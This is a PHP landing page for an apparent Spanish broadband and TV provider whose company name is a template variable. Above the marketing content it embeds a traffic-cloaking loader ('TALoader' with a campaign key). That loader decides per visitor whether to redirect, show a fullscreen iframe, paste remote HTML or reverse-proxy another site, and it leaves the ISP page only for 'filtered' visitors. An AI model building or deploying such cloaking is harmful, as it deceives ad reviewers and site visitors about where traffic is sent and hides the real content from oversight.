<?php
$GLOBALS['_ta_campaign_key'] = '05496a43fad65fdec8776248055898e2';
$GLOBALS['_ta_debug_mode'] = false; //To enable debug mode, set to true or load this script with a '?debug_key=05496a43fad65fdec8776248055898e2' parameter

require 'bootloader_d6420468c902ac1ed75497508a155f5e.php';

$campaign_id = 'a6h21o';

$ta = new TALoader($campaign_id);


if ($ta->suppress_response()) {//Do not send any output when hybrid mode is enabled and a visitor is being filtered (after hybrid page was generated)
    exit;
}

$response = $ta->get_response();
$visitor = $ta->get_visitor();

/*
 * Advanced users: uncomment lines below during development to expose variables you may want to use in your custom code:
 */
//print_r($response);
//print_r($visitor);
//exit;
/*
 * Don't forget to re-comment the lines above before sending live traffic
 */

/*
Note: when using hybrid mode, please use one of our built-in functions as your final step when routing your visitors:
    print header_redirect("http://url.com"); //performs a 302 header redirect (or a window.location=xxx in JS)
    print load_fullscreen_iframe("http://url.com"); //Loads a fullscreen iframe of the specified URL
    print paste_html("http://url.com"); //Downloads HTML in specified URL and outputs it to the screen (uses JS to insert the HTML in hybrid mode)
(These functions will automatically output either regular HTML or JS code depending on what the visitor's browser is expecting)
*/

switch ($response['action']) {
    case 'header_redirect':
        print header_redirect($response['url']); //Uses <script>window.location='xxx'</script> when in hybrid mode (required behaviour)
        exit;
    case 'iframe':
        print load_fullscreen_iframe($response['url']);
        exit;
    case 'paste_html':
        print paste_html($response['output_html']);
        exit;
    case 'reverse_proxy':
        if(!empty($_GET['rp'])) {
            reverse_proxy($response['url'], "tarp_d6420468c902ac1ed75497508a155f5e/");

            header('location: '.$_GET['rp']);
            exit;
        }

        print reverse_proxy($response['url'], "tarp_d6420468c902ac1ed75497508a155f5e/");
        exit;        
    /* Please be VERY CAREFUL if modifying this block: */
    case 'load_hybrid_page':
        $ta->load_hybrid_page();
        break;
    /* ...it is needed for hybrid mode to function correctly */
    default:
        print other_methods($response['url']);
        break;    
}
/*
 * Note: if using the "Remain on Fail URL" action for Filtered Visitors, append your Fail URL's HTML/PHP code after the closing PHP tag below:
 */
?>




<?php
include 'inc/layout/head.php';
?>


<body class="home">

	<?php
	include 'inc/layout/header.php';
	?>
	<section class="c-s hero-section">
		<div class="container">
			<div class="hero-content text-right">
				<div class="row dm">
					<div class="col-lg-12 dp">
						<span class="hero-subtitle"><?php echo $serverName; ?></span>
						<h1 class="hero-title">Super Velocidad para que no te quedes atrás <br><span class="primary-accent"><?php echo $serverName; ?></span></h1>
						<p><b><?php echo $serverName; ?></b> te ofrece en sus diferentes tarifas la máxima velocidad. Te ofrecemos buenas tarifas para que tu bolsillo no lo note. Contacta con nosotros, estamos para atenderte.</p>
						<div class="button-wrapper">
							<a class="button contact-modal-trigger">Quiero más información</a>
						</div>
					</div>
				</div>
			</div>
		</div>
	</section>
	<section class="c-s section-features bg-w-secondary">
		<div class="container">
			<div class="section-content section-features-content">
				<div class="row dm">
					<div class="col-lg-12 dp">
						<div class="features-intro-text text-center">
							<p class="features-i-small primary-accent">UN ANCHO DE BANDA QUE PUEDES DISFRUTAR EN CASA O EN TU EMPRESA</p>
							<p class="features-i-big">Conexiones de banda ancha seguras, rápidas y eficientes. No querrás dejar de navegar.</p>
						</div>
						<div class="features-col-wrapper">
							<div class="features-col">
								<div class="features-col-i">
									<span class="material-icons-two-tone icon-accent features-icon">done_outline</span>
									<span>Wi-Fi sin problemas</span>
								</div>
							</div>
							<div class="features-col">
								<div class="features-col-i">
									<span class="material-icons-two-tone icon-accent features-icon">done_outline</span>
									<span>Velocidad bajo demanda</span>
								</div>
							</div>
							<div class="features-col">
								<div class="features-col-i">
									<span class="material-icons-two-tone icon-accent features-icon">done_outline</span>
									<span>Velocidad de actualización</span>
								</div>
							</div>
							<div class="features-col">
								<div class="features-col-i">
									<span class="material-icons-two-tone icon-accent features-icon">done_outline</span>
									<span>Descargar 1 Gbps</span>
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>
		</div>
	</section>
	<section class="c-s section-about">
		<div class="container">
			<div class="section-content section-about-content">
				<div class="row dm">
					<div class="col-lg-6 dp">
						<div class="about-img-w mimg-t">
							<img src="img/about-1.jpg" class="about-img img-fluid" alt="" />
						</div>
					</div>
					<div class="col-lg-6 dp">
						<div class="about-text about-text-1">
							<span class="primary-accent about-subtitle">ACERCA DE <?php echo $serverName; ?></span>
							<h2 class="about-title">¡Deporte, cine, documentales y <span class="primary-accent">tus series favoritas!</span> !</h2>
							<p>Con nuestros servicios podrás disfrutar en tu Smart TV de la mejor programación y estarás siempre al día. Que no te dejen atrás.</p>
							<div class="button-wrapper">
								<a class="button contact-modal-trigger">Quiero más información</a>
							</div>
						</div>
					</div>
				</div>
				<div class="row dm row-mt">
					<div class="col-lg-6 dp">
						<div class="about-text about-text-2 text-right">
							<span class="primary-accent about-subtitle">Obtenga Internet ultrarrápido</span>
							<h2 class="about-title">Experimenta una nueva forma <span class="primary-accent">de conectarte</span></h2>
							<p>Nunca antes has probado conexiones ultrarápidas como las nuestras. ¿Te lo vas a perder?</p>
							<div class="button-wrapper">
								<a class="button contact-modal-trigger">Llámenos ahora para conectar <?php echo $serverName; ?></a>
							</div>
						</div>
					</div>
					<div class="col-lg-6 dp">
						<div class="about-img-w mimg-t">
							<img src="img/about-2.jpg" class="about-img img-fluid" alt="" />
						</div>
					</div>
				</div>
			</div>
		</div>
	</section>
	<section class="c-s section-plans bg-w-secondary">
		<div class="container">
			<div class="section-content section-plans-content">
				<div class="plans-intro-text text-center">
					<p class="features-i-small primary-accent">PLANES INTELIGENTES</p>
					<p class="features-i-big">¡Encuentra un paquete que se adapte a ti, a tu familia o tu negocio! Somos flexibles y tenemos muchos servicios a un precio increíble.</p>
				</div>
				<div class="plans-wrapper">
					<div class="row dm">
						<div class="col-lg-4 dp">
							<div class="pricing-plan">
								<div class="plan-name">
									<h3>
										Móvil
									</h3>
								</div>
								<div class="price-wrap">
									<span class="plan-sign">€</span>
									<span class="plan-price">11.25</span>
									<span class="plan-duration">/mes</span>
								</div>
								<div class="plan-features">
									<ul class="list-styled-circle">
										<li><span class="material-icons-two-tone">done_outline</span>Muchos datos de navegación y con posibilidad de acumularlos.</li>
										<li><span class="material-icons-two-tone">done_outline</span>Sin permanencia.</li>
										<li><span class="material-icons-two-tone">done_outline</span>Líneas adicionales con descuento.</li>
									</ul>
								</div>
								<div class="plan-button text-center">
									<a href="#" class="button contact-modal-trigger">Comprar ahora</a>
								</div>
							</div>
						</div>
						<div class="col-lg-4 dp">
							<div class="pricing-plan">
								<div class="plan-name">
									<h3>
										Fibra
									</h3>
								</div>
								<div class="price-wrap">
									<span class="plan-sign">€</span>
									<span class="plan-price">25.29</span>
									<span class="plan-duration">/mes</span>
								</div>
								<div class="plan-features">
									<ul class="list-styled-circle">
										<li><span class="material-icons-two-tone">done_outline</span>Fibra de 100Mb.</li>
										<li><span class="material-icons-two-tone">done_outline</span>Llamadas ilimitadas.</li>
										<li><span class="material-icons-two-tone">done_outline</span>Sube y baja muy rápido.</li>
										<li><span class="material-icons-two-tone">done_outline</span>Elige líneas adicionales con descuento.</li>
									</ul>
								</div>
								<div class="plan-button text-center">
									<a href="#" class="button contact-modal-trigger">Comprar ahora</a>
								</div>
							</div>
						</div>
						<div class="col-lg-4 dp">
							<div class="pricing-plan">
								<div class="plan-name">
									<h3>
										Móvil + Fibra
									</h3>
								</div>
								<div class="price-wrap">
									<span class="plan-sign">€</span>
									<span class="plan-price">33.29</span>
									<span class="plan-duration">/mes</span>
								</div>
								<div class="plan-features">
									<ul class="list-styled-circle">
										<li><span class="material-icons-two-tone">done_outline</span>Fibra de 100Mb.</li>
										<li><span class="material-icons-two-tone">done_outline</span>Sube y baja contenido a una súper velocidad.</li>
										<li><span class="material-icons-two-tone">done_outline</span>Te damos el router gratis.</li>
										<li><span class="material-icons-two-tone">done_outline</span>Contrata líneas adicionales con descuento.</li>
									</ul>
								</div>
								<div class="plan-button text-center">
									<a href="#" class="button contact-modal-trigger">Comprar ahora</a>
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>
		</div>
		<section class="section-highlights">
			<div class="container">
				<div class="section-content section-highlights-content">
					<div class="row dm">
						<div class="col-lg-4 col-6 dp hl-col">
							<img src="img/f-icon-1.png" class="img-fluid f-icon" alt="" />
							<span class="hl-text">Más de 250 canales</span>
						</div>
						<div class="col-lg-4 col-6 dp hl-col">
							<img src="img/f-icon-2.png" class="img-fluid f-icon" alt="" />
							<span class="hl-text">Velocidad perfecta</span>
						</div>
						<div class="col-lg-4 col-6 dp hl-col">
							<img src="img/f-icon-3.png" class="img-fluid f-icon" alt="" />
							<span class="hl-text">Instalación gratuita</span>
						</div>
						<div class="col-lg-4 col-6 dp hl-col">
							<img src="img/f-icon-4.png" class="img-fluid f-icon" alt="" />
							<span class="hl-text">Calidad 4K y 8K</span>
						</div>
						<div class="col-lg-4 col-6 dp hl-col">
							<img src="img/f-icon-5.png" class="img-fluid f-icon" alt="" />
							<span class="hl-text">Planes Flexibles</span>
						</div>
						<div class="col-lg-4 col-6 dp hl-col">
							<img src="img/f-icon-6.png" class="img-fluid f-icon" alt="" />
							<span class="hl-text">Soporte rápido 24/7</span>
						</div>
					</div>
				</div>
			</div>
		</section>
	</section>

<?php
include 'inc/layout/footerLayout.php';
?>
